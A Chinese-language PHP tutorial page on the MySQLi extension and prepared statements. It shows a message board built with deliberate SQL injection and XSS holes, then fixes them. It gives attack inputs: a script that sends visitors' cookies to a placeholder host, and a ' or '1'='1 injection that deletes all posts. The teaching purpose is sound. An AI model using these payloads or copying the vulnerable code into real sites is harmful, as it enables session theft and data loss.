<html>
<head>
	<title>線上教材：WEB 程式設計</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<link rel=stylesheet type="text/css" href="myCss.css" />
	<base target="_blank">
	<script type="text/javascript" src="myJs.js"></script>
	<script type="text/javascript" src="shCore.js"></script>
	<script type="text/javascript" src="shBrushXml.js"></script>
	<script type="text/javascript" src="shBrushMine.js"></script>
	<link href="shCore.css" rel="stylesheet" type="text/css" />
	<link href="shThemeDefault.css" rel="stylesheet" type="text/css" />
	<script type="text/javascript">
		SyntaxHighlighter.all();
	</script>
	</head>

<body bgcolor="#ccccff">

<blockquote>

<p>
MySQLi 是 MySQL 針對 PHP 所設計的擴充模組，其中的 i 是 imporved 的意思。PHP 官方強烈建議，若是使用 MySQL 4.1.3 或之後的版本，請使用 mysqli 的擴充。其最顯而易見的優點，就是"prepared statement"的使用，讓設計者可以比較容易處理 SQL injection 等問題。基本的使用方式，跟舊型的擴充一樣是：建立連線、送出查詢、取得結果。</p>

<p>我們先從排行榜資料顯示的範例開始看起：</p>
<pre class="brush: htmljsphp">﻿&lt;?phpinclude(&quot;mysqliInc.php&quot;);?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#ccccff&quot;&gt;&lt;table border=&quot;1&quot;&gt;	&lt;tr&gt;		&lt;th&gt;資料序號&lt;/th&gt;		&lt;th&gt;當日排名&lt;/th&gt;		&lt;th&gt;前日排名&lt;/th&gt;		&lt;th&gt;歌曲名稱&lt;/th&gt;		&lt;th&gt;演 唱 者&lt;/th&gt;	&lt;/tr&gt;	&lt;?php		$result = mysqli_query($link, &quot;SELECT * from songrank&quot;);		while($row=mysqli_fetch_array($result)){			echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row['id'].&quot;&lt;/td&gt;&quot;;			echo &quot;&lt;td&gt;&quot;.$row['this_rank'].&quot;&lt;/td&gt;&quot;;			echo &quot;&lt;td&gt;&quot;.$row['prev_rank'].&quot;&lt;/td&gt;&quot;;			echo &quot;&lt;td&gt;&quot;.$row['song_name'].&quot;&lt;/td&gt;&quot;;			echo &quot;&lt;td&gt;&quot;.$row['singer_name'].&quot;&lt;/td&gt;&lt;/tr&gt;&quot;;		}		mysqli_free_result($result);		mysqli_close($link);	?&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;</pre>
<br>
<p>其中，mysqliInc.php 的內容如下</p>
<pre class="brush: htmljsphp">﻿&lt;?php$db_server = &quot;localhost&quot;;$db_user = &quot;abcd&quot;;$db_passwd = &quot;1234&quot;;$db_name = &quot;wxyz&quot;;$link = @mysqli_connect($db_server, $db_user, $db_passwd, $db_name);if(!$link){	die('無法對資料庫連線');}mysqli_query($link, &quot;SET NAMES utf8&quot;);?&gt;</pre>
<br>
<p>單純的顯示固定資料只需要用到 select，而且不需要接受使用者輸入。若是我們將 insert, delete 也用上，並且接上了使用者輸入，就可以做出許多變化。例如一個簡單的匿名留言板，可以自訂留言時的綽號，以及留言時可以自訂將來刪除用的密碼。</p>

<p>我們建立一張資料表 msgboard 給這個留言板使用，包含以下欄位(你可以依據個別需求來調整細部設定，例如若需支援中文，可以將編碼選定為 utf8_general_ci)：</p>
<ul>
	<li>id: int，代表留言用編號，與密碼對照後可刪除。此數設定為主鍵並自動遞增</li>
	<li>nickname: VARCHAR，長度 32，代表留言用的綽號</li>
	<li>time: TIMESTAMP，預設值處需選擇「CURRENT_TIMESTAMP」，代表留言的時間</li>
	<li>content: VARCHAR，長度 1024，代表留言內容</li>
	<li>pwd: VARCHAR，長度 16，代表刪除用的密碼</li>
	<li>ip: VARCHAR，長度 40，代表留言的 IP</li>
</ul>

<p>完整的範例如下：</p>
<pre class="brush: htmljsphp">﻿&lt;?phpinclude(&quot;../examples/mysqliInc.php&quot;);function showMsg($row){	$nn = $row['nickname'];	$msg = $row['content'];	echo &quot;#&quot;.$row['id'].&quot;: &quot;.$msg.&quot; by &quot;.$nn.&quot;&lt;br&gt;&quot;;}// 如果有留言，則加入之if(isset($_POST['nickname']) &amp; isset($_POST['content']) &amp;&amp; $_POST['nickname'] &amp;&amp; $_POST['content']){	$nn = $_POST['nickname'];	$msg = $_POST['content'];	$pwd = $_POST['pwd'];	$sql = &quot;INSERT INTO msgboard (nickname, content, pwd) VALUES ('$nn', '$msg', '$pwd')&quot;;	mysqli_query($link, $sql);	echo '&lt;meta http-equiv=REFRESH CONTENT=0;url=php_mysqli_msgBoard_01.php&gt;';}// 如果有刪除請求，則刪除之if(isset($_POST['del_id']) &amp; isset($_POST['del_pwd']) &amp;&amp; $_POST['del_id'] &amp;&amp; $_POST['del_pwd']){	$id = $_POST['del_id'];	$pwd = $_POST['del_pwd'];	$sql = &quot;DELETE FROM msgboard WHERE id='$id' AND pwd='$pwd'&quot;;	mysqli_query($link, $sql);	echo '&lt;meta http-equiv=REFRESH CONTENT=0;url=php_mysqli_msgBoard_01.php&gt;';}?&gt;&lt;html&gt;&lt;head&gt;&lt;style&gt;textarea{vertical-align:top}&lt;/style&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#ccccff&quot;&gt;&lt;form action=&quot;php_mysqli_msgBoard_01.php&quot; method=&quot;post&quot;&gt;	&lt;p&gt;	綽號：&lt;input type=&quot;text&quot; name=&quot;nickname&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;	內容：&lt;input type=&quot;text&quot; name=&quot;content&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;	密碼：&lt;input type=&quot;text&quot; name=&quot;pwd&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;	&lt;/p&gt;	&lt;p&gt;	刪除編號：&lt;input type=&quot;text&quot; name=&quot;del_id&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;	該篇密碼：&lt;input type=&quot;text&quot; name=&quot;del_pwd&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;	&lt;/p&gt;	&lt;input type=&quot;submit&quot; value=&quot;送出&quot;&gt;&lt;/form&gt;&lt;hr&gt;&lt;?php	$sql = 'SELECT * from msgboard ORDER BY id DESC';	$result = mysqli_query($link, $sql);	while($row = mysqli_fetch_array($result)){		showMsg($row);	}?&gt;&lt;/body&gt;&lt;/html&gt;</pre>
<br>
<p>但是，這個留言板存在不少問題，以下進行簡單的解說：</p>
<ul>
	<li>Script Insertion / XSS (cross site script)：此一範例完全沒有阻擋特殊字元的輸入，如果在內容處輸入「&lt;script&gt;alert("OAO");&lt;/script&gt;」，則每個來看留言板的人，就都會看到警告視窗跳出。		需要注意的是，若可以插入警告視窗，則很可能代表你可以插入更加惡意的程式碼，例如「&lt;script&gt;location.href="http://somehost?aaa.php?c="+document.cookie;&lt;/script&gt;」</li>
	<li>SQL injection：在形成 SQL 指令時，是用字串連接的方式，而若使用者加入惡意字元，則會達成意想不到的效果。首先，請試著在 id 欄輸入任何內容，並在密碼欄輸入「' or '1'='1」。你會發現留言全部不見了！原因是，串出來的 SQL 指令變為「DELETE FROM msgboard WHERE id='你填的id' AND pwd='<font color="red">' or '1'='1</font>'」</li>
	<li>其他還有諸如<a href="http://plainpass.com/">密碼沒加密</a>等等，都是可能造成危險的作法。</li>
</ul>

<p>其中的 SQL injection 問題，可以使用"prepared statement"來避免。 若想使用"prepared statement"，有幾個基本步驟：</p>
<ol>
	<li>預備：串出 SQL 字串，但是把原本條件值的地方用問號取代</li>
	<li>綁定參數，此時必須同時指定型別，例如 i 為整數，d 為浮點數，s 為字串</li>
	<li>執行與取出結果</li>
</ol>

<p>首先是用於 select 的範例，這個範例可以讓你選出當日排名在特定值之前的資料：</p>
<pre class="brush: htmljsphp">﻿&lt;?phpinclude(&quot;mysqliInc.php&quot;);?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#ccccff&quot;&gt;&lt;form action=&quot;php_mysqli_showRankTable_prepare.php&quot; method=&quot;post&quot;&gt;	&lt;input type=&quot;text&quot; name=&quot;maxrank&quot; placeholder=&quot;請輸入排名值&quot; value=&quot;&quot;&gt;	&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;table border=&quot;1&quot;&gt;	&lt;tr&gt;		&lt;th&gt;當日排名&lt;/th&gt;		&lt;th&gt;歌曲名稱&lt;/th&gt;		&lt;th&gt;演 唱 者&lt;/th&gt;	&lt;/tr&gt;	&lt;?php		$maxrank = (isset($_POST['maxrank'])&amp;&amp;$_POST['maxrank']!='')?$_POST['maxrank']:50;		$sql = &quot;SELECT this_rank, song_name, singer_name from songrank WHERE this_rank &lt;= ?&quot;;		$stmt = mysqli_prepare($link, $sql);		mysqli_stmt_bind_param($stmt, 'd', $maxrank);		mysqli_stmt_execute($stmt);		mysqli_stmt_bind_result($stmt, $row['this_rank'], $row['song_name'], $row['singer_name']);		while(mysqli_stmt_fetch($stmt)){			echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row['this_rank'].&quot;&lt;/td&gt;&quot;;			echo &quot;&lt;td&gt;&quot;.$row['song_name'].&quot;&lt;/td&gt;&quot;;			echo &quot;&lt;td&gt;&quot;.$row['singer_name'].&quot;&lt;/td&gt;&lt;/tr&gt;&quot;;		}	?&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;</pre>
<br>
<p>上述範例的寫法稱為 Procedural style，但也可以使用物件的風格(Object oriented style)來撰寫程式碼：</p>
<pre class="brush: htmljsphp">﻿&lt;?phpinclude(&quot;mysqliInc_obj.php&quot;);?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#ccccff&quot;&gt;&lt;form action=&quot;php_mysqli_showRankTable_prepare_obj.php&quot; method=&quot;post&quot;&gt;	&lt;input type=&quot;text&quot; name=&quot;maxrank&quot; placeholder=&quot;請輸入排名值&quot; value=&quot;&quot;&gt;	&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;table border=&quot;1&quot;&gt;	&lt;tr&gt;		&lt;th&gt;當日排名&lt;/th&gt;		&lt;th&gt;歌曲名稱&lt;/th&gt;		&lt;th&gt;演 唱 者&lt;/th&gt;	&lt;/tr&gt;	&lt;?php		$maxrank = (isset($_POST['maxrank'])&amp;&amp;$_POST['maxrank']!='')?$_POST['maxrank']:50;		$sql = &quot;SELECT this_rank, song_name, singer_name from songrank WHERE this_rank &lt;= ?&quot;;		$stmt = $link-&gt;prepare($sql);		$stmt-&gt;bind_param('d', $maxrank);		$stmt-&gt;execute();		$stmt-&gt;bind_result($row['this_rank'], $row['song_name'], $row['singer_name']);		while($stmt-&gt;fetch()){			echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row['this_rank'].&quot;&lt;/td&gt;&quot;;			echo &quot;&lt;td&gt;&quot;.$row['song_name'].&quot;&lt;/td&gt;&quot;;			echo &quot;&lt;td&gt;&quot;.$row['singer_name'].&quot;&lt;/td&gt;&lt;/tr&gt;&quot;;		}	?&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;</pre>
<br>
<p>其中的 mysqliInc_obj.php，主要是將資料庫線方式也更換為 Object oriented style，如下：</p>
<pre class="brush: htmljsphp">&lt;?php$db_server = &quot;localhost&quot;;$db_user = &quot;abcd&quot;;$db_passwd = &quot;1234&quot;;$db_name = &quot;wxyz&quot;;mysqli_report(MYSQLI_REPORT_STRICT);try{	$link = new mysqli($db_server, $db_user, $db_passwd, $db_name);}catch (Exception $e){	die('無法對資料庫連線');}@$link-&gt;query(&quot;SET NAMES utf8&quot;);?&gt;</pre>
<br>
<p>在上面的幾個範例當中，如果 SQL 語句是"SELECT * FROM ..."，則在 bind_result 時會有一長串參數，並且需要知道欄位順序。此時，我們可以先透過 mysqli_stmt_result_metadata 以及 mysqli_fetch_field 取出所有欄位，再利用 call_user_func_array 一口氣完成 bind：</p>
<pre class="brush: htmljsphp">﻿&lt;?phpinclude(&quot;mysqliInc.php&quot;);?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#ccccff&quot;&gt;&lt;form action=&quot;php_mysqli_showRankTable_prepare_selstar.php&quot; method=&quot;post&quot;&gt;	&lt;input type=&quot;text&quot; name=&quot;maxrank&quot; placeholder=&quot;請輸入排名值&quot; value=&quot;&quot;&gt;	&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;table border=&quot;1&quot;&gt;	&lt;tr&gt;		&lt;th&gt;資料序號&lt;/th&gt;		&lt;th&gt;當日排名&lt;/th&gt;		&lt;th&gt;前日排名&lt;/th&gt;		&lt;th&gt;歌曲名稱&lt;/th&gt;		&lt;th&gt;演 唱 者&lt;/th&gt;	&lt;/tr&gt;	&lt;?php		$maxrank = (isset($_POST['maxrank']) &amp;&amp; $_POST['maxrank'] != '')?$_POST['maxrank']:50;		$sql = &quot;SELECT * from songrank WHERE this_rank &lt;= ?&quot;;		$stmt = mysqli_prepare($link, $sql);		mysqli_stmt_bind_param($stmt, 'd', $maxrank);		mysqli_stmt_execute($stmt);		$meta = mysqli_stmt_result_metadata($stmt);		while($field = mysqli_fetch_field($meta)){			$params[] = &amp;$row[$field-&gt;name];		}		call_user_func_array(array($stmt, 'bind_result'), $params);		while(mysqli_stmt_fetch($stmt)){			echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row['id'].&quot;&lt;/td&gt;&quot;;			echo &quot;&lt;td&gt;&quot;.$row['this_rank'].&quot;&lt;/td&gt;&quot;;			echo &quot;&lt;td&gt;&quot;.$row['prev_rank'].&quot;&lt;/td&gt;&quot;;			echo &quot;&lt;td&gt;&quot;.$row['song_name'].&quot;&lt;/td&gt;&quot;;			echo &quot;&lt;td&gt;&quot;.$row['singer_name'].&quot;&lt;/td&gt;&lt;/tr&gt;&quot;;		}	?&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;</pre>
<br>
<p>我們以匿名留言版的範例，來了解如何將 prepared statement 用於 insert 敘述(此處混用了 Procedural style 和 Object oriented style，不過並不是很好的習慣)：</p>
<pre class="brush: htmljsphp">﻿&lt;?phpinclude(&quot;mysqliInc.php&quot;);function getIp(){	return $_SERVER['REMOTE_ADDR'];}function showMsg($row){	$nn = htmlspecialchars($row['nickname']);	$msg = htmlspecialchars($row['content']);	$msg = str_replace(&quot;\n&quot;, &quot;&lt;br&gt;&quot;, $msg);	echo &quot;&lt;table border=\&quot;1\&quot;&gt;&lt;tr&gt;&quot;;	echo &quot;&lt;td&gt;留言人: &quot;.$nn.&quot;&lt;/td&gt;&quot;;	echo &quot;&lt;td&gt;時間: &quot;.$row['time'].&quot;&lt;/td&gt;&quot;;	echo &quot;&lt;td&gt;位置: &quot;.$row['ip'].&quot;&lt;/td&gt;&lt;/tr&gt;&quot;;	echo &quot;&lt;tr&gt;&lt;td colspan=\&quot;3\&quot;&gt;留言內容:&lt;br&gt;&quot;.$msg.&quot;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;&quot;;}// 如果有留言，則加入之if(isset($_POST['nickName']) &amp;&amp; isset($_POST['msgBody']) &amp;&amp; $_POST['nickName']!='' &amp;&amp; $_POST['msgBody']!=''){	$sql = &quot;INSERT INTO msgboard (nickname, content, ip) VALUES (?, ?, ?)&quot;;	$stmt = $link-&gt;prepare($sql);	$stmt-&gt;bind_param(		'sss',		$_POST['nickName'], $_POST['msgBody'], getIp()	);	$stmt-&gt;execute();	echo '&lt;meta http-equiv=REFRESH CONTENT=0;url=php_mysqli_msgBoard.php&gt;';}?&gt;&lt;html&gt;&lt;head&gt;&lt;style&gt;textarea{vertical-align:top}&lt;/style&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#ccccff&quot;&gt;&lt;form action=&quot;php_mysqli_msgBoard.php&quot; method=&quot;post&quot;&gt;	綽號：&lt;input type=&quot;text&quot; name=&quot;nickName&quot;&gt;&lt;br&gt;	內容：&lt;textarea name=&quot;msgBody&quot;&gt;&lt;/textarea&gt;&lt;br&gt;	&lt;input type=&quot;submit&quot; value=&quot;送出&quot;&gt;&lt;/form&gt;&lt;hr&gt;&lt;?php	$result = mysqli_query($link, &quot;SELECT * from msgboard ORDER BY id DESC&quot;);	while($row = mysqli_fetch_array($result)){		showMsg($row);	}?&gt;&lt;/body&gt;&lt;/html&gt;</pre>
<br>
<p>在上述範例中，也順便以「htmlspecialchars」處理了 XSS 的問題；而為了範例呈現的考量，輸入密碼移除留言的功能則暫不示範如何修改；各位若有興趣，可參考"Session"篇章對密碼進行 md5 等加密的方式，來保護使用者提供的密碼。</p>

</blockquote>

</body></html>
